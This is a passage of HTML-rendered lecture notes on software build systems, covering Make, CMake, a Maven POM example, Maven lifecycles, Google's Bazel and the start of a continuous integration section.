&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;$(EXEC)&lt;/span&gt;: &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;$(&lt;/span&gt;&lt;span style=&#34;color:#40ffff&#34;&gt;OBJS&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;-include&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;$(&lt;/span&gt;&lt;span style=&#34;color:#40ffff&#34;&gt;DEPS&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;.PHONY&lt;/span&gt;: clean
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;clean&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	rm -f &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;$(&lt;/span&gt;EXEC&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;$(&lt;/span&gt;OBJS&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;$(&lt;/span&gt;DEPS&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/details&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/smcintosh/makeexample&#34;&gt;Example Makefile&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/elibroftw/bootleg-settlers-of-katan/blob/master/Makefile&#34;&gt;More complicated but succinct Makefile&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;express dependencies with &lt;code&gt;program: program2 program3&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;requires tabs not spaces&lt;/li&gt;
&lt;li&gt;write recipes&lt;/li&gt;
&lt;li&gt;variables (lazy evaluation)
&lt;ul&gt;
&lt;li&gt;x = &amp;ldquo;a command&amp;rdquo;&lt;/li&gt;
&lt;li&gt;$(x)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;parallelization: make -j8&lt;/li&gt;
&lt;li&gt;% wildcard is greedy (%.o → foo.o.o)
&lt;ul&gt;
&lt;li&gt;the % must be equal on both sides of the rule&lt;/li&gt;
&lt;li&gt;$&amp;lt;:  expands to the first dependency&lt;/li&gt;
&lt;li&gt;$^: expands to the entire list of dependencies&lt;/li&gt;
&lt;li&gt;$@: expands to the name of the target&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;header files are dependents on .o files because .c files might not actually change&lt;/li&gt;
&lt;li&gt;Make has built-in rules for compiling c files and linking o files
&lt;ul&gt;
&lt;li&gt;.o files: &lt;code&gt;$(CC) $(CPPFLAGS) $(CFLAGS) -c&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;linking automatically works for programs where a source code exists&lt;/li&gt;
&lt;li&gt;string manipulation: either use &lt;code&gt;${OBJS:.o=.d}&lt;/code&gt; or &lt;code&gt;$(patsubt %.o,%.d,$(OBJS))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Shortcoming of Make&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Shell scripts are not portable (cross platform)&lt;/li&gt;
&lt;li&gt;Boilerplate expressions need to be repeated&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&#34;https://aegis.sourceforge.net/auug97.pdf&#34;&gt;Recursive Make Considered Harmful&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Every make only knows the dependencies of itself, not subdirectories it calls make on&lt;/li&gt;
&lt;li&gt;People would order the recursions to build one project before another&lt;/li&gt;
&lt;li&gt;Distrust in incremental build process&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Addressed&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Apache Ant (low level). Uses Java for recipes&lt;/li&gt;
&lt;li&gt;Scons and Raek use Python and Ruby as first-class languages to enable portable and extensible build code&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;abstraction-based-build&#34; &gt;Abstraction-based build
&lt;span&gt;
    &lt;a href=&#34;#abstraction-based-build&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;&amp;ldquo;There is only one problem in software engineer problem that cannot be solved by adding a layer of abstraction: too many layers of abstraction&amp;rdquo;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;GNU Autotools
&lt;ul&gt;
&lt;li&gt;Generate Makefiles&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CMake
&lt;ul&gt;
&lt;li&gt;Generate Makefiles&lt;/li&gt;
&lt;li&gt;Only 3 lines&lt;/li&gt;
&lt;li&gt;Made by the Scientific community&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Meson&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cmake&#34; data-lang=&#34;cmake&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# Set the minimum version of CMake that will be supported by this build file
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#24909d&#34;&gt;cmake_minimum_required&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;VERSION&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;3.5&lt;/span&gt;)&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# Give the project a name
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#24909d&#34;&gt;project&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;CappedRandom&lt;/span&gt;)&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# Add an executable that is made up of the three C source files
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#24909d&#34;&gt;add_executable&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;main&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;main.c&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;input.c&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;random.c&lt;/span&gt;)&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;maven---framework-driven-build-tool&#34; &gt;Maven - Framework Driven Build Tool
&lt;span&gt;
    &lt;a href=&#34;#maven---framework-driven-build-tool&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;details&gt;&lt;summary&gt;Example&lt;/summary&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;project&lt;/span&gt; &lt;span style=&#34;color:#bbb&#34;&gt;xmlns=&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;http://maven.apache.org/POM/4.0.0&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#bbb&#34;&gt;xmlns:xsi=&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#bbb&#34;&gt;xsi:schemaLocation=&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;modelVersion&amp;gt;&lt;/span&gt;4.0.0&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;/modelVersion&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;ca.uwaterloo.cs446&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;mavendeps&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;version&amp;gt;&lt;/span&gt;2022&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;properties&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;project.build.sourceEncoding&amp;gt;&lt;/span&gt;UTF-8&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;/project.build.sourceEncoding&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;maven.compiler.source&amp;gt;&lt;/span&gt;1.8&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;/maven.compiler.source&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;maven.compiler.target&amp;gt;&lt;/span&gt;1.8&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;/maven.compiler.target&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;exec.mainClass&amp;gt;&lt;/span&gt;ca.uwaterloo.cs446.mavendeps.Main&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;/exec.mainClass&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;/properties&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;dependencies&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&amp;lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;org.apache.logging.log4j&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;log4j-core&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;version&amp;gt;&lt;/span&gt;2.22.1&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;/dependencies&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;&amp;lt;/project&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/details&gt;
&lt;ul&gt;
&lt;li&gt;convention over configuration&lt;/li&gt;
&lt;li&gt;concepts: lifecycle, phases, goals, plugins&lt;/li&gt;
&lt;li&gt;assumes a lifecycle&lt;/li&gt;
&lt;li&gt;lifecycle: series of phases&lt;/li&gt;
&lt;li&gt;phase: series of goals to build actions via plugins&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Lifecycles&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;default: produces project deliverables&lt;/li&gt;
&lt;li&gt;clean: initial state&lt;/li&gt;
&lt;li&gt;site: website/docs material&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Lifecycle&lt;/th&gt;
          &lt;th&gt;Phase&lt;/th&gt;
          &lt;th&gt;Goal&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;Default&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;process-resources&lt;/td&gt;
          &lt;td&gt;resources:resources&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;mdash;&lt;/td&gt;
          &lt;td&gt;compile&lt;/td&gt;
          &lt;td&gt;compiler:compile&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;mdash;&lt;/td&gt;
          &lt;td&gt;process-test-resources&lt;/td&gt;
          &lt;td&gt;resources:testResources&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;mdash;&lt;/td&gt;
          &lt;td&gt;test-compile&lt;/td&gt;
          &lt;td&gt;compiler:testCompile&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;mdash;&lt;/td&gt;
          &lt;td&gt;test&lt;/td&gt;
          &lt;td&gt;surefire:test&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;mdash;&lt;/td&gt;
          &lt;td&gt;package&lt;/td&gt;
          &lt;td&gt;jar:jar, par:par, war:war&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;mdash;&lt;/td&gt;
          &lt;td&gt;install&lt;/td&gt;
          &lt;td&gt;install:install&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;mdash;&lt;/td&gt;
          &lt;td&gt;deploy&lt;/td&gt;
          &lt;td&gt;deploy:deploy&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;Clean&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;clean&lt;/td&gt;
          &lt;td&gt;clean:clean&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;Site&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;site&lt;/td&gt;
          &lt;td&gt;site:site&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;mdash;&lt;/td&gt;
          &lt;td&gt;site-deploy&lt;/td&gt;
          &lt;td&gt;site:deploy&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;organizational-scaling&#34; &gt;Organizational Scaling
&lt;span&gt;
    &lt;a href=&#34;#organizational-scaling&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;Build execution is computationally expensive
&lt;ul&gt;
&lt;li&gt;In-memory dependency graph requires plenty of high-speed RAM&lt;/li&gt;
&lt;li&gt;Processor-intensive operation: fast CPU&lt;/li&gt;
&lt;li&gt;Files need to be stat&amp;rsquo;d (modification time), read (source files) and written (intermediate and output files): large and fast disk I/O&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Constraints on parallelism&lt;/li&gt;
&lt;li&gt;Commands are repeated across machines&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;googles-bazel&#34; &gt;Google&amp;rsquo;s Bazel
&lt;span&gt;
    &lt;a href=&#34;#googles-bazel&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Internal built tool is called blaze&lt;/li&gt;
&lt;li&gt;What&amp;rsquo;s the point?
&lt;ul&gt;
&lt;li&gt;Centralized caching to cut down repeated builds&lt;/li&gt;
&lt;li&gt;Cross language&lt;/li&gt;
&lt;li&gt;Language specific implicit rule (e.g. header files)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Starlark: domain-specific build language inspired by Python&lt;/li&gt;
&lt;li&gt;Load build files relevant to target of the execution&lt;/li&gt;
&lt;li&gt;Analyze the inputs and dependencies and produces an action graph&lt;/li&gt;
&lt;li&gt;Execute by traversing the action graph until final build outputs are produced&lt;/li&gt;
&lt;li&gt;Action graph is a directed graph of build artifacts
&lt;ul&gt;
&lt;li&gt;Graph is &lt;a href=&#34;https://docs.bazel.build/versions/0.29.1/query-how-to.html&#34;&gt;queryable&lt;/a&gt; to better understand the build process&lt;/li&gt;
&lt;li&gt;Lot of things are implicitly done&lt;/li&gt;
&lt;li&gt;&lt;code&gt;bazel query &amp;quot;deps(//:mavendeps)&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ci-and-cd&#34; &gt;CI and CD
&lt;span&gt;
    &lt;a href=&#34;#ci-and-cd&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Practitioners (Developers, QA, Release Engineers) ↔ Build System ↔ Development Tools
&lt;ul&gt;
&lt;li&gt;Developers: execute local builds to sync changes and perform simple tests&lt;/li&gt;
&lt;li&gt;QA: automated tests into build system
&lt;ul&gt;
&lt;li&gt;normal builds should provide quick feedback&lt;/li&gt;
&lt;li&gt;slower tests can be relegated to special build targets that are executed less often&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Releng: micro and macro
&lt;ul&gt;
&lt;li&gt;micro-build: behaviour of a build system in a single execution&lt;/li&gt;
&lt;li&gt;macro-build: provisioning fleet of build resources&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DevTools
&lt;ul&gt;
&lt;li&gt;Static analysis: infer, coverity&lt;/li&gt;
&lt;li&gt;Problems like: buffer overflows, resource leaks, dead code, null pointer dereference &amp;amp; exceptions&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Code review
&lt;ul&gt;
&lt;li&gt;pre-merge review&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://codereview.qt-project.org/#/c/140545/&#34;&gt;QT Gerrit code review&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;Qt Sanity Bot&lt;/li&gt;
&lt;li&gt;Qt CI Bot&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Release automation
&lt;ul&gt;
&lt;li&gt;Nightly builds
&lt;ul&gt;
&lt;li&gt;When builds took hours, the build would run at night after the day&amp;rsquo;s changes so that the QA can run tests in the morning&lt;/li&gt;
&lt;li&gt;Too infrequent&lt;/li&gt;
&lt;li&gt;Don&amp;rsquo;t know what change broke the build&lt;/li&gt;
&lt;li&gt;What if you wrote the broken code the day before
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;git bisect&lt;/code&gt; can split the history into two sets of commits&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Continuous builds&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ci&#34; &gt;CI
&lt;span&gt;
    &lt;a href=&#34;#ci&#34;&gt;
